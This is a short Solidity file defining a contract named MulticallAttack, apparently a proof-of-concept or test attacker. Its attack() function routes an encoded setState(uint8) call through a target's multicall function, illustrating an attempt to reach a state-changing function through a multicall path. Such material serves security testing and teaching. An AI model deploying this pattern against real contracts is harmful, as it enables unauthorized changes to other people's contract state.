// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

interface ITarget {
    function multicall(bytes[] calldata data) external returns (bytes[] memory);
}

contract MulticallAttack {
    ITarget public target;
    
    constructor(address _target) {
        target = ITarget(_target);
    }
    
    function attack() external {
        bytes[] memory data = new bytes[](1);
        data[0] = abi.encodeWithSignature("setState(uint8)", 1);
        target.multicall(data);
    }
} 